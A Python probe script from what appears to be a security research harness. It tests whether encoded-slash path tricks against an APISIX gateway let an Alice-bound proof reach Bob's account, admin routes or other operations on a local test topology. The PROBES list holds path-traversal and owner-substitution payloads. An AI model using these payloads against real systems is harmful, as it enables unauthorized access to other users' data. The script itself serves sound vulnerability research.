"""Targeted probes: can the APISIX %2f view/execution split reach a DIFFERENT EXISTING
resource (owner substitution) or a different route, rather than only prefixing the id?
Run against a LIVE apisix topology whose framework decodes %2f inside a segment
(e.g. w13-apisix-default-edge-express-ovoff):

    cd binding/harness && orchestrator/.venv/bin/python ../experiments/ext-gw/scripts/probe_pct2f.py <topology-id>

Each probe mints a proof for the base op's canonical (htm, htu) and replaces the raw target.
A probe "wins" only if the verifier allows AND the executor runs a different op or a
different, existing resource id (e.g. acc-bob-1, u-2) with status < 400.
Writes experiments/ext-gw/ddmin/probe_pct2f__<id>.jsonl.
"""
import json, os, sys, time

HARNESS = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", "..", "harness"))
K = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, HARNESS)
from mutator.base_ops import BASE_OPS_BY_ID, AUTHZ_PLACEHOLDER, PROOF_PLACEHOLDER  # noqa: E402
from rawhttp.client import send  # noqa: E402
from runner.minter_adapter import get_minter  # noqa: E402

# base op whose proof we hold -> raw target we send. The htu bound by the proof is the
# base op's canonical path; the verifier must still ALLOW after APISIX normalises %2f.
PROBES = [
    ("getAccount", "/api/v1/accounts/acc-alice-1"),                         # control (canonical)
    ("getAccount", "/api/v1/accounts/%2facc-alice-1"),                      # control (RC: /-prefixed id)
    ("getAccount", "/api/v1/accounts/acc-alice-1%2f..%2facc-bob-1"),        # owner substitution via encoded ../
    ("getAccount", "/api/v1/accounts/%2e%2e%2faccounts%2facc-bob-1"),       # encoded ../ to sibling
    ("getAccount", "/api/v1/accounts/acc-bob-1%2f..%2facc-alice-1"),        # reverse
    ("getAccount", "/api/v1/accounts%2facc-bob-1"),                         # merge path sep
    ("listAccounts", "/api/v1/accounts%2facc-bob-1"),                       # list proof -> getAccount(bob)?
    ("getAccount", "/api/v1/accounts/acc-alice-1%2f%2e%2e%2fadmin%2fusers"),# cross to admin
    ("publicFile", "/api/v1/public/logo.png%2f..%2f..%2faccounts%2facc-bob-1"),  # public proof -> account
    ("getAccount", "/api/v1/accounts/acc-bob-1"),                           # sanity: different id, no proof match
]


def jl(p):
    return [json.loads(l) for l in open(p) if l.strip()] if os.path.exists(p) else []


def main():
    tid = sys.argv[1]
    yml = os.path.join(K, "topologies", f"{tid}.yaml")
    port = int(next(l.split(":")[1] for l in open(yml) if l.startswith("host_port")))
    logs = os.path.join(HARNESS, "logs", tid)
    m = get_minter(prefer="w3")
    os.makedirs(os.path.join(K, "ddmin"), exist_ok=True)
    out = open(os.path.join(K, "ddmin", f"probe_pct2f__{tid}.jsonl"), "w")
    for base, target in PROBES:
        op = BASE_OPS_BY_ID[base]
        req = op.canonical_request(); req.target = target
        authz, proof, jti = m.mint(client="alice", htm=op.htm, htu=op.htu)
        raw = req.to_bytes().replace(AUTHZ_PLACEHOLDER.encode(), authz.encode()).replace(PROOF_PLACEHOLDER.encode(), proof.encode())
        r = send("127.0.0.1", port, raw, timeout=10); time.sleep(0.3)
        v = next((x for x in jl(os.path.join(logs, "verifier.jsonl")) if x.get("jti") == jti), {})
        e = next((x for x in jl(os.path.join(logs, "executor.jsonl")) if x.get("jti") == jti), {})
        rec = {"base_op": base, "target": target, "status": r.status, "verifier": v.get("decision"),
               "view_uri": v.get("view_uri"), "exec_op": e.get("op_id"), "path_params": e.get("path_params"),
               "resp_body": r.body[:200].decode("utf-8", "replace")}
        out.write(json.dumps(rec) + "\n")
        print(f'{base:13} {target:52} {r.status} V={rec["verifier"]} X={rec["exec_op"]} {rec["path_params"]}')


if __name__ == "__main__":
    main()
